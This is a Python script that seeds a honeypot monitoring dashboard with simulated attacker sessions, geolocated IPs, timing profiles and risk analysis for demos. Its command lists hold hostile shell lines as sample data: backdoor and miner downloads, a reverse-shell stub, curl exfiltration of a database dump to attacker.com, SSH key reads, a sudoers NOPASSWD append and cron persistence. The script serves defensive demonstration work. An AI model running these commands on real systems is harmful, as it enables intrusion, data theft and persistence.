"""
seed_demo_data.py v2.0 — Populates the database with realistic demo data
including behavioral metadata, attacker profiles, and AI narratives.
Run ONCE before a presentation: python seed_demo_data.py
"""

import uuid, random, time
from datetime import datetime, timedelta
import database as db
from ai_analyzer import analyze_session, classify_command
from behavior_analyzer import analyze_behavior, CommandEvent

ATTACKERS = [
    ("45.33.32.156",   "United States",  "US", "Fremont",      "California",     37.5483, -121.9886, "Linode LLC"),
    ("185.220.101.47", "Germany",        "DE", "Frankfurt",    "Hesse",          50.1109,   8.6821, "Tor Project"),
    ("103.27.62.82",   "China",          "CN", "Shanghai",     "Shanghai",       31.2222, 121.4581, "China Telecom"),
    ("77.247.181.162", "Netherlands",    "NL", "Amsterdam",    "North Holland",  52.3740,   4.8897, "Frantech Solutions"),
    ("192.42.116.41",  "Sweden",         "SE", "Stockholm",    "Stockholm",      59.3329,  18.0649, "Bahnhof AB"),
    ("31.13.101.200",  "Russia",         "RU", "Moscow",       "Moscow",         55.7512,  37.6184, "OJSC VimpelCom"),
    ("196.206.20.74",  "South Africa",   "ZA", "Johannesburg", "Gauteng",       -26.1752,  28.0498, "Afrihost"),
    ("41.216.186.91",  "Jordan",         "JO", "Amman",        "Amman",          31.9539,  35.9106, "Zain Jordan"),
    ("202.81.217.108", "Japan",          "JP", "Tokyo",        "Tokyo",          35.6762, 139.6503, "NTT Communications"),
    ("5.188.86.172",   "Kazakhstan",     "KZ", "Almaty",       "Almaty",         43.2220,  76.8512, "Jusan Mobile"),
    ("91.215.153.119", "Ukraine",        "UA", "Kyiv",         "Kyiv City",      50.4501,  30.5234, "Volia Cable"),
    ("89.234.157.254", "France",         "FR", "Paris",        "Ile-de-France",  48.8566,   2.3522, "LDN-NET"),
]

ATTACK_SEQUENCES = {
    "recon":               ["whoami","id","uname -a","hostname","cat /etc/os-release","ifconfig","netstat -an","ps aux","df -h","free -m","cat /etc/passwd","ls -la /home","history"],
    "brute_force":         ["su root","sudo bash","sudo -s","sudo su -","sudo -l","passwd","sudo passwd root"],
    "privilege_escalation":["sudo -l","sudo bash","chmod +s /bin/bash","cat /etc/sudoers","find / -perm -4000 2>/dev/null","ls -la /etc/cron*","crontab -l","echo 'zarqa ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers"],
    "malware_download":    ["wget http://evil.example.com/backdoor.sh -O /tmp/bd.sh","curl http://185.220.101.47/miner -o /tmp/m","chmod +x /tmp/m","/tmp/m &","python3 -c 'import socket,subprocess,os;s=socket.socket()...'","base64 -d <<< 'aGVsbG8=' | bash"],
    "lateral_movement":    ["cat /home/zarqa/.ssh/id_rsa","cat /root/.ssh/authorized_keys","ssh 192.168.1.50 -i /tmp/key","scp /etc/passwd attacker@10.0.0.1:/tmp/","ping 192.168.1.1"],
    "data_exfiltration":   ["mysqldump -u root mydb > /tmp/db.sql","tar czf /tmp/data.tar.gz /var/www/html","find / -name '*.conf' 2>/dev/null","cat /home/zarqa/project/config.yml","curl -d @/tmp/db.sql http://attacker.com/upload"],
    "persistence":         ["crontab -e","echo '*/5 * * * * /tmp/backdoor.sh' | crontab -","echo '/tmp/backdoor.sh' >> /home/zarqa/.bashrc","useradd -m -s /bin/bash hacker","echo 'hacker:password' | chpasswd"],
}

# Behavioral profiles for demo variety
PROFILES = {
    "bot":    {"delay_mean":0.1, "delay_std":0.05, "extra_cmds":0},
    "script": {"delay_mean":1.2, "delay_std":0.4,  "extra_cmds":2},
    "human":  {"delay_mean":5.0, "delay_std":2.0,  "extra_cmds":4},
}


def make_session(attacker, attack_type, hours_ago):
    ip, country, cc, city, region, lat, lon, isp = attacker
    s_uuid = str(uuid.uuid4())
    start  = datetime.utcnow() - timedelta(hours=hours_ago, minutes=random.randint(0,59))

    sid = db.create_session(s_uuid, ip, random.randint(40000,65000), "zarqa", "2026")
    db.update_session_geo(sid, {"country":country,"countryCode":cc,"city":city,
                                "regionName":region,"lat":lat,"lon":lon,"isp":isp})

    seq_cmds = ATTACK_SEQUENCES.get(attack_type, ATTACK_SEQUENCES["recon"])
    profile_name = random.choice(["bot","bot","script","script","human"])
    profile = PROFILES[profile_name]

    extra = random.choices(["ls","pwd","whoami","cat /etc/hosts","uptime"],
                           k=profile["extra_cmds"])
    all_cmds = seq_cmds + extra

    # Build CommandEvents with realistic timing
    now = time.time() - hours_ago * 3600
    events = []
    for i, cmd in enumerate(all_cmds):
        delay = max(0.05, random.gauss(profile["delay_mean"], profile["delay_std"]))
        now  += delay
        events.append(CommandEvent(seq=i+1, command=cmd, timestamp=now, delay_sec=delay))

    duration = sum(e.delay_sec for e in events)

    for ev in events:
        atypes = classify_command(ev.command)
        db.log_command(sid, ev.command, "(output)", ev.seq,
                       attack_types=atypes, delay_sec=ev.delay_sec)

    db.close_session(sid, duration)

    # Run full analysis (no LLM in seeding to avoid API calls)
    type_counts = {}
    for cmd in all_cmds:
        for t in classify_command(cmd):
            type_counts[t] = type_counts.get(t,0)+1
    if not type_counts: type_counts["unknown"]=1

    from config import RISK_WEIGHTS,RISK_THRESHOLDS
    score = sum(RISK_WEIGHTS.get(t,1)*c for t,c in type_counts.items())
    level = next((l for l,(lo,hi) in RISK_THRESHOLDS.items() if lo<=score<=hi),"High")
    primary = max(type_counts, key=lambda t: RISK_WEIGHTS.get(t,1)*type_counts[t])

    meta = analyze_behavior(sid, events, duration, type_counts, score)
    db.update_session_behavior(sid, meta.to_dict())

    from ai_analyzer import _build_evidence_recommendations
    recs = _build_evidence_recommendations(list(type_counts.keys()), all_cmds, type_counts)
    narrative = f"[Demo] {meta.attacker_type.replace('_',' ').title()} conducting {primary.replace('_',' ')} phase. Risk: {level} (score {score}). Profile: {meta.attack_phase}."

    db.save_attack_analysis(sid, {
        "attack_types":     list(type_counts.keys()),
        "primary_type":     primary,
        "risk_level":       level,
        "risk_score":       score,
        "recommendations":  recs,
        "ai_narrative":     narrative,
        "llm_provider":     "fallback",
        "attacker_type":    meta.attacker_type,
        "attack_phase":     meta.attack_phase,
        "behavior_evidence": meta.evidence,
    })

    if level in ("High","Medium"):
        db.save_alert(sid, ip, country, primary, level,
                      f"[Demo] {level} risk from {ip} ({country})")


def seed():
    db.init_db()
    print("🌱 Seeding v2.0 demo data…")
    attack_types = list(ATTACK_SEQUENCES.keys())
    n = 0
    for hours_back in range(0, 168, 3):
        for _ in range(random.randint(1,6)):
            make_session(random.choice(ATTACKERS),
                         random.choice(attack_types),
                         hours_back + random.random())
            n += 1

    stats = db.get_dashboard_stats()
    print(f"""
✅ Demo data seeded!
   Sessions    : {stats['total_sessions']}
   Unique IPs  : {stats['unique_ips']}
   Countries   : {stats['countries']}
   High Risk   : {stats['high_risk']}
   Bots        : {stats['bots_detected']}
   Commands    : {stats['total_commands']}

Now run:  python run.py
""")


if __name__ == "__main__":
    seed()
